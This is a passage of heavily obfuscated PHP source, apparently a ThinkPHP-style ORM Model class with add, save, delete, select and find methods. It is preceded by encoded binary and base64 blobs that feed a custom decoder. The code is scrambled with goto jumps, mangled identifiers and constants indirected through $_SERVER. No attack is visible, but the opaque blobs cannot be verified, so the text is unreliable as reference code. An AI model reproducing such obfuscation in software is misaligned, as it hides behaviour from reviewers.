253\265\213\205\147\261\170\2\135\356\64\113\347\13\134\230\65\214\140\206\305"."\104\113\165\354\103\213\166\1\234\56\61\60\217\16\101\135\364\374\270\34\137\261\325\136\314\140\157\31\316\241\227\365\17\311\123\371\323\366\17\320\356\261\357\255\170\41\302\36\247\354\266\76\252\125\310\203\153\124".strrev('ìx„sü¹Yıxê1bí²'."\0".'%q—«Ùw•æœc%ÊgÈCPáfi’Ëy‚N/1[2f©kÉg<¹9‚N1')."\330\150\163\137\271\26\25\17\125\306\253\105\105\344\161\153\301\261\155\227\360\225\370\41\115\251\300\1\371\235\171\71\257\345\151\25\156\360\161\231\160\41\16\133\224\134\313\222\105\165\200\312\12\3\341\212\263\330".base64_decode('sN7k2+Bix3Avp8TvaX+BOgoD2bkDTqgb79HtnUOlQJtLa0p7hZLgRrmiT2wH3BiX7zxz1I2c6DEc7w==')._kodDe('MiA9OT+G9vwvJhSyqeDVJQ+iahAyaO3PPAH/y81gy3re62fPnJfCiGO2Z9+iXRpLWNlnF+LLOrFqx0U=')."\316\270\172\333\245\327\343\204\355\127\236\370\301\245\347\316\226\266\237\176\74\114\274\370\324\367\356\333\204\377\335\366\373\173\336\277\365\1\40\47\142\224\155\33\356\171\177\303\265\73\56\274\176\373\151\167\155\137".base64_decode('99vtF51Gn4C1nPmUnw+5+PG1xU07XuDJ0T2+c0OqYuweB27UHHjdxMkRTTeh+wXA74vot0UzTcqGgA==')."\170\215\60\221\30\210\274\73\11\112\10\40\304\57\155\340\10\241\133\3\104\313\210\347\240\40\271\375\203\233\332\210\202\123\21\247\262\104\340\155\4\213\204\313\257\35\132\113\266\173\107\16\0\333\321\204\66\114".base64_decode('SAk9CMXrA28PSLfYRT2uIkBoWVSpQLqNhhunuIkdhBOV4SRPlzI9SJI9heYe8w/7UyWQ40leBFKOxg==')."\247\115\135\301\150\334\277\44\20\211\106\312\222\102\236\110\244\47\30\366\141\135\352\262\144\224\113\320\137\51\113\12\265\7\273\306\113\363\167\172\2\35\145\151\120\237\5\152\170\323\327\165\161\122\40\204\152\351"."\351\350\240\12\225\345\265\10\170\27\362\232\240\153\126\176\146\136\314\152\364\130\330\246\354\105\257\30\42\62\235\154\342\43\62\112\236\235\166\11\105\130\317\36\304\141\66\350\213\317\54\120\54\333\201\10\302\3"."\324\71\351\42\205\205\251\353\323\56\377\42\316\70\230\64\214\32\44\52\264\361\213\144\227\345\302\131\200\243\311\202\330\227\100\204\342\322\214\0\265\25\173\114\274\30\56\277\6\100\251\274\13\140\115\27\120\147"."\x27\x2b\xb5\x84\x70\xcc\x8f\x79\x9a\x85\x9b\x89\x7a\x42\x38\x4c\x92\xff\x1f\x98\xc5\x5a\x3a\xa1\xc8\x0\x0"."".base64_decode(''), 10, -8))); goto fá¹‚Úâ÷‹; AòŠóÌ¦¿: define($_SERVER[¬ˆÚÂ”Éğä][227], 2); define($_SERVER[¬ˆÚÂ”Éğä][228], 3); define($_SERVER[¬ˆÚÂ”Éğä][229], 1); goto E®”î•Åé; EšÅÎ…¸ã†: function beforeShutdownFatalError($E•¬Ññ£­) { think_exception($E•¬Ññ£­); } $_SERVER[$_SERVER[í][45]] = $dÃÀ¡òİ•($_SERVER[$_SERVER[í][42]]); $D‚ÜåŸã¼ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto d’é¦Û‹²«; E®”î•Åé: define($_SERVER[¬ˆÚÂ”Éğä][230], 0); define($_SERVER[¬ˆÚÂ”Éğä][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\144\145\x72", "\x61\x6c\151\x61\x73", "\x68\141\166\x69\156\x67", "\x67\162\157\x75\160", "\x6c\x6f\x63\153", "\144\151\163\x74\x69\156\143\164", "\x61\165\x74\x6f", "\146\151\154\164\145\162", "\x76\141\154\x69\x64\141\x74\x65", "\162\x65\163\x75\x6c\x74", "\142\x69\x6e\144", "\164\157\153\145\x6e"); public function __construct($BØ“íõŠê = '', $CÙõÁâ¦Ò = '', $aÛ¶‚•ƒïê = '') { $a˜‘Äâ­ÕŸ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->_initialize(); if (!empty($BØ“íõŠê)) { if (strpos($BØ“íõŠê, $a˜‘Äâ­ÕŸ[91])) { list($this->dbName, $this->name) = explode($a˜‘Äâ­ÕŸ[91], $BØ“íõŠê); } else { $this->name = $BØ“íõŠê; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CÙõÁâ¦Ò)) { $this->tablePrefix = $a˜‘Äâ­ÕŸ[33]; } elseif ($a˜‘Äâ­ÕŸ[33] != $CÙõÁâ¦Ò) { $this->tablePrefix = $CÙõÁâ¦Ò; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($a˜‘Äâ­ÕŸ[232]); } $this->db(0, empty($this->connection) ? $aÛ¶‚•ƒïê : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bĞ„ë¯’ö« =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($this->fields)) { if (think_config($bĞ„ë¯’ö«[233])) { $dƒ•ù´Ë± = $this->dbName ? $this->dbName : think_config($bĞ„ë¯’ö«[234]); $E‹¯‘Ü®èœ = think_var_cache($bĞ„ë¯’ö«[235] . strtolower(get_path_this($dƒ•ù´Ë±) . $bĞ„ë¯’ö«[91] . $this->name)); if ($E‹¯‘Ü®èœ) { $bØÊ²´„”ë = think_config($bĞ„ë¯’ö«[236]); if (empty($bØÊ²´„”ë) || $E‹¯‘Ü®èœ[$bĞ„ë¯’ö«[237]] == $bØÊ²´„”ë) { $this->fields = $E‹¯‘Ü®èœ; return; } } } $this->flush(); } } public function flush() { goto EóïÊç‘±×; dÙâ½‡¼í: foreach ($fÁŸ÷…µå­ as $c¿¦”¨´ÃĞ => $EÎ¡ä´è¾¿) { $bšíçàÍ[$c¿¦”¨´ÃĞ] = $EÎ¡ä´è¾¿[$a¡ÃÊÔßË [29]]; if ($EÎ¡ä´è¾¿[$a¡ÃÊÔßË [36]]) { $this->fields[$a¡ÃÊÔßË [239]] = $c¿¦”¨´ÃĞ; if ($EÎ¡ä´è¾¿[$a¡ÃÊÔßË [39]]) { $this->fields[$a¡ÃÊÔßË [238]] = !0; } } } $this->fields[$a¡ÃÊÔßË [240]] = $bšíçàÍ; if (think_config($a¡ÃÊÔßË [236])) { $this->fields[$a¡ÃÊÔßË [237]] = think_config($a¡ÃÊÔßË [236]); } goto BîÉ´ïî‰Š; cÄìô†â“³: if (!$fÁŸ÷…µå­) { return !1; } $this->fields = array_keys($fÁŸ÷…µå­); $this->fields[$a¡ÃÊÔßË [238]] = !1; goto dÙâ½‡¼í; EóïÊç‘±×: $a¡ÃÊÔßË  =& $_SERVER[¬ˆÚÂ”Éğä]; $this->db->setModel($this->name); $fÁŸ÷…µå­ = $this->db->getFields($this->getTableName()); goto cÄìô†â“³; BîÉ´ïî‰Š: if (think_config($a¡ÃÊÔßË [233])) { $f—› ¥Óó = $this->dbName ? $this->dbName : think_config($a¡ÃÊÔßË [234]); think_var_cache($a¡ÃÊÔßË [235] . strtolower(get_path_this($f—› ¥Óó) . $a¡ÃÊÔßË [91] . $this->name), $this->fields); } goto aë©Ÿˆ…—; aë©Ÿˆ…—: } public function switchModel($e¤½ÜíË×¹, $bƒŠ¿ï½•£ = array()) { $dÀ¦‡ˆõç =& $_SERVER[¬ˆÚÂ”Éğä]; $B†¯´ÄÎ‘… = ucwords(strtolower($e¤½ÜíË×¹)) . $dÀ¦‡ˆõç[241]; if (!class_exists($B†¯´ÄÎ‘…)) { think_exception($B†¯´ÄÎ‘… . think_lang($dÀ¦‡ˆõç[242])); } $this->_extModel = new $B†¯´ÄÎ‘…($this->name); if (!empty($bƒŠ¿ï½•£)) { foreach ($bƒŠ¿ï½•£ as $cŒŒİ¢ÎÈ¯) { $this->_extModel->setProperty($cŒŒİ¢ÎÈ¯, $this->{$cŒŒİ¢ÎÈ¯}); } } return $this->_extModel; } public function __set($f„¢°š‘‘ê, $C×Ë‚§™ê) { $this->data[$f„¢°š‘‘ê] = $C×Ë‚§™ê; } public function __get($Eó‚½ôˆ–ª) { return isset($this->data[$Eó‚½ôˆ–ª]) ? $this->data[$Eó‚½ôˆ–ª] : null; } public function __isset($EÆµĞŠ») { return isset($this->data[$EÆµĞŠ»]); } public function __unset($Dµ‰”ØàîÖ) { unset($this->data[$Dµ‰”ØàîÖ]); } public function __call($F­—ÛÄ§±ö, $d¸ó¯ÅÜ”ï) { $Fªêù·Æ‰ =& $_SERVER[¬ˆÚÂ”Éğä]; if (in_array(strtolower($F­—ÛÄ§±ö), $this->methods, !0)) { $this->options[strtolower($F­—ÛÄ§±ö)] = $d¸ó¯ÅÜ”ï[0]; return $this; } elseif (in_array(strtolower($F­—ÛÄ§±ö), array($Fªêù·Æ‰[243], $Fªêù·Æ‰[244], $Fªêù·Æ‰[245], $Fªêù·Æ‰[246], $Fªêù·Æ‰[247]), !0)) { $cçµ åĞ¹Œ = isset($d¸ó¯ÅÜ”ï[0]) ? $d¸ó¯ÅÜ”ï[0] : $Fªêù·Æ‰[176]; $cçµ åĞ¹Œ = $this->db->parseKey($cçµ åĞ¹Œ); return $this->getField(strtoupper($F­—ÛÄ§±ö) . $Fªêù·Æ‰[248] . $cçµ åĞ¹Œ . $Fªêù·Æ‰[249] . $F­—ÛÄ§±ö, $Fªêù·Æ‰[243]); } elseif (strtolower(substr($F­—ÛÄ§±ö, 0, 5)) == $Fªêù·Æ‰[250]) { $cçµ åĞ¹Œ = think_parse_name(substr($F­—ÛÄ§±ö, 5)); $cª·Ù–±•§[$cçµ åĞ¹Œ] = $d¸ó¯ÅÜ”ï[0]; return $this->where($cª·Ù–±•§)->find(); } elseif (strtolower(substr($F­—ÛÄ§±ö, 0, 10)) == $Fªêù·Æ‰[251]) { $bàâëïšÔ„ = think_parse_name(substr($F­—ÛÄ§±ö, 10)); $cª·Ù–±•§[$bàâëïšÔ„] = $d¸ó¯ÅÜ”ï[0]; return $this->where($cª·Ù–±•§)->getField($d¸ó¯ÅÜ”ï[1]); } elseif (isset($this->_scope[$F­—ÛÄ§±ö])) { return $this->scope($F­—ÛÄ§±ö, $d¸ó¯ÅÜ”ï[0]); } elseif (method_exists($this, $F­—ÛÄ§±ö)) { array_unshift($d¸ó¯ÅÜ”ï, $F­—ÛÄ§±ö); return call_user_func_array(array($this, $Fªêù·Æ‰[252]), $d¸ó¯ÅÜ”ï); } else { return call_user_func_array(array(parent, $F­—ÛÄ§±ö), $d¸ó¯ÅÜ”ï); } } protected function call() { goto B¢„‹ÏëĞ; DğÜÓ˜ÓÈ: if (isset($B¯†ê–Ğ[$fòê¤’İ‘£]) && $B¯†ê–Ğ[$fòê¤’İ‘£] === $dÆ´İÈˆßŸ) { think_exception(__CLASS__ . $C„ã Ï¸šª[4] . $dÆ´İÈˆßŸ . think_lang($C„ã Ï¸šª[253])); return; } $B¯†ê–Ğ[] = $dÆ´İÈˆßŸ; if (method_exists($this, $C„ã Ï¸šª[254])) { $dñÃ‚ÀÁÙø = call_user_func_array(array($this, $C„ã Ï¸šª[255]), array($CÚøŒ¡¦™, $B¯†ê–Ğ)); if (!is_null($dñÃ‚ÀÁÙø) && $dñÃ‚ÀÁÙø !== !1) { return $dñÃ‚ÀÁÙø; } } goto B ˆí·ÛøÏ; B¢„‹ÏëĞ: $C„ã Ï¸šª =& $_SERVER[¬ˆÚÂ”Éğä]; $B¯†ê–Ğ = func_get_args(); $dÆ´İÈˆßŸ = array_shift($B¯†ê–Ğ); goto Cê°ÆÊ¥ìÙ; B ˆí·ÛøÏ: $BÜí·ÃÒ· = call_user_func_array(array($this, $dÆ´İÈˆßŸ), $B¯†ê–Ğ); if (method_exists($this, $C„ã Ï¸šª[256])) { $dñÃ‚ÀÁÙø = call_user_func_array(array($this, $C„ã Ï¸šª[257]), array($CÚøŒ¡¦™, $B¯†ê–Ğ, $BÜí·ÃÒ·)); if ($dñÃ‚ÀÁÙø) { return $dñÃ‚ÀÁÙø; } } return $BÜí·ÃÒ·; goto aíŠñêˆ¤ğ; Cê°ÆÊ¥ìÙ: $CÚøŒ¡¦™ = $dÆ´İÈˆßŸ; if (is_array($dÆ´İÈˆßŸ)) { $CÚøŒ¡¦™ = $dÆ´İÈˆßŸ[1]; $dÆ´İÈˆßŸ = $dÆ´İÈˆßŸ[0]; } $fòê¤’İ‘£ = count($B¯†ê–Ğ) - 1; goto DğÜÓ˜ÓÈ; aíŠñêˆ¤ğ: } protected function _initialize() { } protected function _facade($dÖ½ËÑ…ƒÄ) { $CÒ±Ø¬ì£ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($this->fields)) { foreach ($dÖ½ËÑ…ƒÄ as $A¨ôÕŸ‚ƒÜ => $dŞªã†‚°Å) { if (!in_array($A¨ôÕŸ‚ƒÜ, $this->fields, !0)) { unset($dÖ½ËÑ…ƒÄ[$A¨ôÕŸ‚ƒÜ]); } elseif (is_scalar($dŞªã†‚°Å)) { $this->_parseType($dÖ½ËÑ…ƒÄ, $A¨ôÕŸ‚ƒÜ); } } } if (!empty($this->options[$CÒ±Ø¬ì£[258]])) { $dÖ½ËÑ…ƒÄ = array_map($this->options[$CÒ±Ø¬ì£[258]], $dÖ½ËÑ…ƒÄ); unset($this->options[$CÒ±Ø¬ì£[258]]); } $this->_beforeWrite($dÖ½ËÑ…ƒÄ); return $dÖ½ËÑ…ƒÄ; } protected function _beforeWrite(&$CĞ¹ÉÒ¾›¬) { } public function add($E±¤ŸÉÊŠ• = '', $fæºÛÍïšÙ = array(), $b‡‡·’“Åº = false) { goto FŠ¯ª¢ÛÔñ; f›«Ş¾½: return $Bñ¶ÂóĞ÷Ñ; goto a–»‘…øÌ; cÓ—ˆËß–•: if (!1 === $this->_beforeInsert($E±¤ŸÉÊŠ•, $fæºÛÍïšÙ)) { return !1; } $Bñ¶ÂóĞ÷Ñ = $this->db->insert($E±¤ŸÉÊŠ•, $fæºÛÍïšÙ, $b‡‡·’“Åº); if (!1 !== $Bñ¶ÂóĞ÷Ñ) { $eŒÒö²Åàä = $this->getLastInsID(); if ($eŒÒö²Åàä) { $E±¤ŸÉÊŠ•[$this->getPk()] = $eŒÒö²Åàä; $this->_after_insert($E±¤ŸÉÊŠ•, $fæºÛÍïšÙ); return $eŒÒö²Åàä; } $this->_after_insert($E±¤ŸÉÊŠ•, $fæºÛÍïšÙ); } goto f›«Ş¾½; FŠ¯ª¢ÛÔñ: if (empty($E±¤ŸÉÊŠ•)) { if (!empty($this->data)) { $E±¤ŸÉÊŠ• = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¬ˆÚÂ”Éğä][259]); return !1; } } $fæºÛÍïšÙ = $this->_parseOptions($fæºÛÍïšÙ); $E±¤ŸÉÊŠ• = $this->_facade($E±¤ŸÉÊŠ•); goto cÓ—ˆËß–•; a–»‘…øÌ: } protected function _beforeInsert(&$d·õîŒÖÔâ, $CÛáÂ°÷ù¦) { } protected function _after_insert($FÓÒØìË÷ø, $fÒœõ•µ£) { } public function addAll($dÅÑëÕßô, $BÉµÙ¡ëŒ = array(), $FìÈÂ®™ùÀ = false) { goto Eç‘Öâ­™«; Eç‘Öâ­™«: $d—¶Ü»¾‹„ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($dÅÑëÕßô)) { $this->error = think_lang($d—¶Ü»¾‹„[259]); return !1; } $BÉµÙ¡ëŒ = $this->_parseOptions($BÉµÙ¡ëŒ); goto Aº­„»Š¹; Aº­„»Š¹: foreach ($dÅÑëÕßô as $eå‚×Üä‰ => $eŸ•ë×Ãè‘) { $dÅÑëÕßô[$eå‚×Üä‰] = $this->_facade($eŸ•ë×Ãè‘); } if (method_exists($this->db, $d—¶Ü»¾‹„[260])) { $C„›ÊèˆÙ = $this->db->insertAll($dÅÑëÕßô, $BÉµÙ¡ëŒ, $FìÈÂ®™ùÀ); } else { $this->startTrans(); foreach ($dÅÑëÕßô as $eå‚×Üä‰ => $eŸ•ë×Ãè‘) { $C„›ÊèˆÙ = $this->db->insert($eŸ•ë×Ãè‘, $BÉµÙ¡ëŒ, $FìÈÂ®™ùÀ); } $this->commit(); } if (!1 !== $C„›ÊèˆÙ) { $d¥áÈ‚É½ = $this->getLastInsID(); if ($d¥áÈ‚É½) { return $d¥áÈ‚É½; } } goto EİßÚ½Ä¶; EİßÚ½Ä¶: return $C„›ÊèˆÙ; goto c—Í”Æ¿äó; c—Í”Æ¿äó: } public function selectAdd($FÏ›”è‚­ = '', $b™šç“„ŒÉ = '', $aÈ—ô¡ò˜ = array()) { $EÊÃùŠ„»½ =& $_SERVER[¬ˆÚÂ”Éğä]; $aÈ—ô¡ò˜ = $this->_parseOptions($aÈ—ô¡ò˜); if (!1 === ($bæ¬°´Şì = $this->db->selectInsert($FÏ›”è‚­ ? $FÏ›”è‚­ : $aÈ—ô¡ò˜[$EÊÃùŠ„»½[261]], $b™šç“„ŒÉ ? $b™šç“„ŒÉ : $this->getTableName(), $aÈ—ô¡ò˜))) { $this->error = think_lang($EÊÃùŠ„»½[262]); return !1; } else { return $bæ¬°´Şì; } } public function save($bÅ¸˜“’É = '', $aùòõ¦÷Ò‘ = array()) { goto BÏ‰ß åÄô; AÅØ ôÍ»: if (is_array($aùòõ¦÷Ò‘[$C’ïœÇ¥Ÿæ[263]]) && isset($aùòõ¦÷Ò‘[$C’ïœÇ¥Ÿæ[263]][$C¶à«¤œ¶])) { $A¿‚‹Ê„¨ = $aùòõ¦÷Ò‘[$C’ïœÇ¥Ÿæ[263]][$C¶à«¤œ¶]; } if (!1 === $this->_beforeUpdate($bÅ¸˜“’É, $aùòõ¦÷Ò‘)) { return !1; } $fùÕ²àêÜø = $this->db->update($bÅ¸˜“’É, $aùòõ¦÷Ò‘); goto CÅÀ³ËÜ†; E“¿ù‘®å: $aùòõ¦÷Ò‘ = $this->_parseOptions($aùòõ¦÷Ò‘); $C¶à«¤œ¶ = $this->getPk(); if (!isset($aùòõ¦÷Ò‘[$C’ïœÇ¥Ÿæ[263]])) { if (isset($bÅ¸˜“’É[$C¶à«¤œ¶])) { $C†Â§¨„¡ˆ[$C¶à«¤œ¶] = $bÅ¸˜“’É[$C¶à«¤œ¶]; $aùòõ¦÷Ò‘[$C’ïœÇ¥Ÿæ[263]] = $C†Â§¨„¡ˆ; unset($bÅ¸˜“’É[$C¶à«¤œ¶]); } else { $this->error = think_lang($C’ïœÇ¥Ÿæ[262]); return !1; } } goto AÅØ ôÍ»; CÅÀ³ËÜ†: if (!1 !== $fùÕ²àêÜø) { if (isset($A¿‚‹Ê„¨)) { $bÅ¸˜“’É[$C¶à«¤œ¶] = $A¿‚‹Ê„¨; } $this->_afterUpdate($bÅ¸˜“’É, $aùòõ¦÷Ò‘); } return $fùÕ²àêÜø; goto BæÈ‡†·ëÚ; BÏ‰ß åÄô: $C’ïœÇ¥Ÿæ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($bÅ¸˜“’É)) { if (!empty($this->data)) { $bÅ¸˜“’É = $this->data; $this->data = array(); } else { $this->error = think_lang($C’ïœÇ¥Ÿæ[259]); return !1; } } $bÅ¸˜“’É = $this->_facade($bÅ¸˜“’É); goto E“¿ù‘®å; BæÈ‡†·ëÚ: } protected function _beforeUpdate(&$E¡å¿ÂÈ°–, $cÄƒŞôÇ) { } protected function _afterUpdate($F¨òé†“Š, $e¯›ß´§ƒ·) { } public function delete($FÛ¯ùÃ§–ï = array()) { goto c—Ù–ÑÏ¤; EÒÍæ¶Õô: $eùÑ³©­ä‰ = $this->db->delete($FÛ¯ùÃ§–ï); if (!1 !== $eùÑ³©­ä‰) { $c¯ø ×Êğ¤ = array(); if (isset($f„Ôæƒ‹¨˜)) { $c¯ø ×Êğ¤[$f·¯—øİ‘§] = $f„Ôæƒ‹¨˜; } $this->_after_delete($c¯ø ×Êğ¤, $FÛ¯ùÃ§–ï); } return $eùÑ³©­ä‰; goto dšÜŞóªÜ‘; FŠÛ‹‡‹è¶: if (is_numeric($FÛ¯ùÃ§–ï) || is_string($FÛ¯ùÃ§–ï)) { if (strpos($FÛ¯ùÃ§–ï, $Fª¢®à¿ Ô[47])) { $fŒ¼òç¿[$f·¯—øİ‘§] = array($Fª¢®à¿ Ô[264], $FÛ¯ùÃ§–ï); } else { $fŒ¼òç¿[$f·¯—øİ‘§] = $FÛ¯ùÃ§–ï; } $this->options[$Fª¢®à¿ Ô[263]] = $fŒ¼òç¿; } $FÛ¯ùÃ§–ï = $this->_parseOptions(); if (is_array($FÛ¯ùÃ§–ï[$Fª¢®à¿ Ô[263]]) && isset($FÛ¯ùÃ§–ï[$Fª¢®à¿ Ô[263]][$f·¯—øİ‘§])) { $f„Ôæƒ‹¨˜ = $FÛ¯ùÃ§–ï[$Fª¢®à¿ Ô[263]][$f·¯—øİ‘§]; } goto EÒÍæ¶Õô; c—Ù–ÑÏ¤: $Fª¢®à¿ Ô =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($FÛ¯ùÃ§–ï) && empty($this->options[$Fª¢®à¿ Ô[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $f·¯—øİ‘§ = $this->getPk(); goto FŠÛ‹‡‹è¶; dšÜŞóªÜ‘: } protected function _after_delete($dœ®’²©ÚÁ, $E–ÚÃ˜ğ¼) { } public function select($BÎ¼‹“·Ÿ = array()) { goto aö“´šÏÏØ; F…ÁÛêÖª·: $this->_afterSelect($cœî¨º‡, $BÎ¼‹“·Ÿ); return $cœî¨º‡; goto c„ôóÖ›â§; DÏİ®÷¼‚‡: $cœî¨º‡ = $this->db->select($BÎ¼‹“·Ÿ); if (!1 === $cœî¨º‡) { return !1; } if (empty($cœî¨º‡)) { return null; } goto F…ÁÛêÖª·; aö“´šÏÏØ: $f·ññóºˆ® =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_string($BÎ¼‹“·Ÿ) || is_numeric($BÎ¼‹“·Ÿ)) { $e—÷óÇÁöÁ = $this->getPk(); if (strpos($BÎ¼‹“·Ÿ, $f·ññóºˆ®[47])) { $aó™Ô§«™²[$e—÷óÇÁöÁ] = array($f·ññóºˆ®[264], $BÎ¼‹“·Ÿ); } else { $aó™Ô§«™²[$e—÷óÇÁöÁ] = $BÎ¼‹“·Ÿ; } $this->options[$f·ññóºˆ®[263]] = $aó™Ô§«™²; } elseif (!1 === $BÎ¼‹“·Ÿ) { $BÎ¼‹“·Ÿ = $this->_parseOptions(); return $f·ññóºˆ®[265] . $this->db->buildSelectSql($BÎ¼‹“·Ÿ) . $f·ññóºˆ®[266]; } $BÎ¼‹“·Ÿ = $this->_parseOptions(); goto DÏİ®÷¼‚‡; c„ôóÖ›â§: } protected function _afterSelect(&$dÅÙ®²ŸæÄ, $fÖ°Ğ‡ÌË) { } public function buildSql($BáÚ»¬ = array()) { $AôÑŒ‡Ûß =& $_SERVER[¬ˆÚÂ”Éğä]; $BáÚ»¬ = $this->_parseOptions($BáÚ»¬); return $AôÑŒ‡Ûß[265] . $this->db->buildSelectSql($BáÚ»¬) . $AôÑŒ‡Ûß[266]; } public function optionsValue($B¬˜¶ñÉèÕ = null) { if (is_null($B¬˜¶ñÉèÕ)) { return $this->options; } elseif (is_array($B¬˜¶ñÉèÕ)) { $this->options = array_merge($this->options, $B¬˜¶ñÉèÕ); } } protected function _parseOptions($cŞÆÚŞŒ› = array()) { goto Eš°‰¯±Æ„; Eš°‰¯±Æ„: $aÚ¿ï“©‡ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($cŞÆÚŞŒ›)) { $cŞÆÚŞŒ› = array_merge($this->options, $cŞÆÚŞŒ›); } $this->options = array(); goto dŠÈÇ¾­ê; dŠÈÇ¾­ê: if (!isset($cŞÆÚŞŒ›[$aÚ¿ï“©‡[267]])) { $cŞÆÚŞŒ›[$aÚ¿ï“©‡[267]] = $this->getTableName(); $e£ª‘Óš©’ = $this->fields; } else { $e£ª‘Óš©’ = $this->getDbFields(); } if (!empty($cŞÆÚŞŒ›[$aÚ¿ï“©‡[268]])) { $cŞÆÚŞŒ›[$aÚ¿ï“©‡[267]] .= $aÚ¿ï“©‡[50] . $cŞÆÚŞŒ›[$aÚ¿ï“©‡[268]]; } $cŞÆÚŞŒ›[$aÚ¿ï“©‡[269]] = $this->name; goto D¼ÉšäˆŠ„; D¼ÉšäˆŠ„: if (isset($cŞÆÚŞŒ›[$aÚ¿ï“©‡[263]]) && is_array($cŞÆÚŞŒ›[$aÚ¿ï“©‡[263]]) && !empty($e£ª‘Óš©’) && !isset($cŞÆÚŞŒ›[$aÚ¿ï“©‡[270]]) && !isset($cŞÆÚŞŒ›[$aÚ¿ï“©‡[267]])) { foreach ($cŞÆÚŞŒ›[$aÚ¿ï“©‡[263]] as $aôµ‰”ÌÎî => $dµ÷–ÕÊ¶’) { $aôµ‰”ÌÎî = trim($aôµ‰”ÌÎî); if (in_array($aôµ‰”ÌÎî, $e£ª‘Óš©’, !0)) { if (is_scalar($dµ÷–ÕÊ¶’)) { $this->_parseType($cŞÆÚŞŒ›[$aÚ¿ï“©‡[263]], $aôµ‰”ÌÎî); } } elseif (!is_numeric($aôµ‰”ÌÎî) && $aÚ¿ï“©‡[70] != substr($aôµ‰”ÌÎî, 0, 1) && !1 === strpos($aôµ‰”ÌÎî, $aÚ¿ï“©‡[91]) && !1 === strpos($aôµ‰”ÌÎî, $aÚ¿ï“©‡[248]) && !1 === strpos($aôµ‰”ÌÎî, $aÚ¿ï“©‡[271]) && !1 === strpos($aôµ‰”ÌÎî, $aÚ¿ï“©‡[272])) { unset($cŞÆÚŞŒ›[$aÚ¿ï“©‡[263]][$aôµ‰”ÌÎî]); } } } $this->_options_filter($cŞÆÚŞŒ›); return $cŞÆÚŞŒ›; goto bÅ‹òÒë×é; bÅ‹òÒë×é: } protected function _options_filter(&$CŠ‡ÇŒô¡²) { } protected function _parseType(&$f²ƒÉ»„¿‘, $a‘îğªêõ¹) { $DÓß¶ŞÊåÊ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($this->options[$DÓß¶ŞÊåÊ[273]][$DÓß¶ŞÊåÊ[4] . $a‘îğªêõ¹])) { $eìé´›¢ª¼ = strtolower($this->fields[$DÓß¶ŞÊåÊ[240]][$a‘îğªêõ¹]); if (!1 !== strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[274])) { } elseif (!1 === strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[275]) && !1 !== strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[276])) { $f²ƒÉ»„¿‘[$a‘îğªêõ¹] = intval($f²ƒÉ»„¿‘[$a‘îğªêõ¹]); } elseif (!1 !== strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[277]) || !1 !== strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[278])) { $f²ƒÉ»„¿‘[$a‘îğªêõ¹] = floatval($f²ƒÉ»„¿‘[$a‘îğªêõ¹]); } elseif (!1 !== strpos($eìé´›¢ª¼, $DÓß¶ŞÊåÊ[279])) { $f²ƒÉ»„¿‘[$a‘îğªêõ¹] = (bool) $f²ƒÉ»„¿‘[$a‘îğªêõ¹]; } } } public function find($D³Í‰¨´ÅÌ = array()) { goto AÉÇ‹ Š³ğ; Cƒ¶Â: $D³Í‰¨´ÅÌ = $this->_parseOptions(); $b½ëë¶¯é¡ = $this->db->select($D³Í‰¨´ÅÌ); if (!1 === $b½ëë¶¯é¡) { return !1; } goto E¯•Œ’¹ÇÅ; Bòˆ¼®øÀ¾: if (!empty($this->options[$CÙ½Ï¤”Œ[281]])) { return $this->returnResult($this->data, $this->options[$CÙ½Ï¤”Œ[281]]); } return $this->data; goto Bšª¿ùà‘Ó; AÉÇ‹ Š³ğ: $CÙ½Ï¤”Œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_numeric($D³Í‰¨´ÅÌ) || is_string($D³Í‰¨´ÅÌ)) { $Aó©æ±ˆ[$this->getPk()] = intval($D³Í‰¨´ÅÌ); $this->options[$CÙ½Ï¤”Œ[263]] = $Aó©æ±ˆ; } $this->options[$CÙ½Ï¤”Œ[280]] = 1; goto Cƒ¶Â; E¯•Œ’¹ÇÅ: if (empty($b½ëë¶¯é¡)) { return null; } $this->data = $b½ëë¶¯é¡[0]; $this->_afterFind($this->data, $D³Í‰¨´ÅÌ); goto Bòˆ¼®øÀ¾; Bšª¿ùà‘Ó: } protected function _afterFind(&$aë…áó”ïˆ, $a·Šã³“›) { } protected function returnResult($aÜÑÄ ˆÀ, $Eæ†‰Ûçª = '') { $aÕîÑâÀÇ˜ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Eæ†‰Ûçª) { if (is_callable($Eæ†‰Ûçª)) { return call_user_func($Eæ†‰Ûçª, $aÜÑÄ ˆÀ); } switch (strtolower($Eæ†‰Ûçª)) { case $aÕîÑâÀÇ˜[282]: return json_encode($aÜÑÄ ˆÀ); case $aÕîÑâÀÇ˜[283]: return xml_encode($aÜÑÄ ˆÀ); } } return $aÜÑÄ ˆÀ; } public function parseFieldsMap($e†Ö›Ğ‚, $aäšá‘‡† = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cª‰ÛöõÈö => $bëñ¶®¡¢) { if 